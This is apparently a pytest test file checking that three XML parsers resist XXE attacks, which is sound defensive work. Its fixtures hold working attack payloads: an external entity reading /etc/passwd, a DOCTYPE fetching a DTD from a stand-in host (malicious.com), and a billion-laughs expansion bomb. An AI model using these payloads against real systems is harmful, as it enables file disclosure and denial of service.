#!/usr/bin/env python3

import pytest
import os
from app.parsers import etree_parser, lxml_parser, minidom_parser


# Malicious XML payloads for testing XXE vulnerabilities
XXE_FILE_READ = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>
    <value>&xxe;</value>
</data>'''

XXE_EXTERNAL_DTD = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://malicious.com/evil.dtd">
<data>
    <value>test</value>
</data>'''

BILLION_LAUGHS = '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<data>
    <value>&lol4;</value>
</data>'''

# Normal XML for testing legitimate functionality
NORMAL_XML = '''<?xml version="1.0" encoding="UTF-8"?>
<data>
    <item>test1</item>
    <item>test2</item>
</data>'''


class TestETreeParser:
    """Test xml.etree.ElementTree parser for XXE vulnerabilities"""
    
    def test_etree_xxe_file_read_protection(self):
        """Test that ElementTree parser blocks external entity file reads"""
        result = etree_parser.parse_xml(XXE_FILE_READ)
        # Should not contain sensitive file contents like /etc/passwd
        result_str = str(result)
        assert 'root:' not in result_str.lower()
        assert '/bin/bash' not in result_str.lower()
        assert '/bin/sh' not in result_str.lower()
    
    def test_etree_external_dtd_protection(self):
        """Test that ElementTree parser blocks external DTD references"""
        # Should either parse safely or raise exception, but not fetch external DTD
        try:
            result = etree_parser.parse_xml(XXE_EXTERNAL_DTD)
            # If it doesn't raise, ensure it parsed safely
            assert result is not None
        except Exception:
            # Raising exception for external DTD is acceptable
            pass
    
    def test_etree_normal_xml_works(self):
        """Test that ElementTree parser still processes normal XML"""
        result = etree_parser.parse_xml(NORMAL_XML)
        assert result is not None
        assert 'test1' in str(result) or 'item' in str(result)


class TestLxmlParser:
    """Test lxml parser for XXE vulnerabilities"""
    
    def test_lxml_xxe_file_read_protection(self):
        """Test that lxml parser blocks external entity file reads"""
        result = lxml_parser.parse_xml(XXE_FILE_READ)
        result_str = str(result)
        # Should not contain sensitive file contents
        assert 'root:' not in result_str.lower()
        assert '/bin/bash' not in result_str.lower()
        assert '/bin/sh' not in result_str.lower()
    
    def test_lxml_billion_laughs_protection(self):
        """Test that lxml parser handles entity expansion attacks"""
        # Should not cause excessive memory usage or hang
        try:
            result = lxml_parser.parse_xml(BILLION_LAUGHS)
            if result:
                result_str = str(result)
                # Should not have expanded entities exponentially
                assert len(result_str) < 100000
        except Exception:
            # Raising exception is acceptable defense
            pass
    
    def test_lxml_normal_xml_works(self):
        """Test that lxml parser still processes normal XML"""
        result = lxml_parser.parse_xml(NORMAL_XML)
        assert result is not None
        assert 'test1' in str(result) or 'item' in str(result)


class TestMinidomParser:
    """Test xml.dom.minidom parser for XXE vulnerabilities"""
    
    def test_minidom_xxe_file_read_protection(self):
        """Test that minidom parser blocks external entity file reads"""
        result = minidom_parser.parse_xml(XXE_FILE_READ)
        result_str = str(result)
        # Should not contain sensitive file contents
        assert 'root:' not in result_str.lower()
        assert '/bin/bash' not in result_str.lower()
        assert '/bin/sh' not in result_str.lower()
    
    def test_minidom_external_dtd_protection(self):
        """Test that minidom parser blocks external DTD references"""
        try:
            result = minidom_parser.parse_xml(XXE_EXTERNAL_DTD)
            # If successful, ensure no external fetch occurred
            assert result is not None
        except Exception:
            # Exception is acceptable
            pass
    
    def test_minidom_normal_xml_works(self):
        """Test that minidom parser still processes normal XML"""
        result = minidom_parser.parse_xml(NORMAL_XML)
        assert result is not None
        assert 'test1' in str(result) or 'item' in str(result)


def test_all_parsers_reject_xxe():
    """Integration test: all three parsers should reject XXE attempts"""
    parsers = [etree_parser, lxml_parser, minidom_parser]
    
    for parser in parsers:
        result = parser.parse_xml(XXE_FILE_READ)
        result_str = str(result).lower()
        
        # None of the parsers should leak file contents
        assert 'root:' not in result_str
        assert 'passwd' not in result_str or 'file:///etc/passwd' in XXE_FILE_READ
        
        # All should still handle normal XML
        normal_result = parser.parse_xml(NORMAL_XML)
        assert normal_result is not None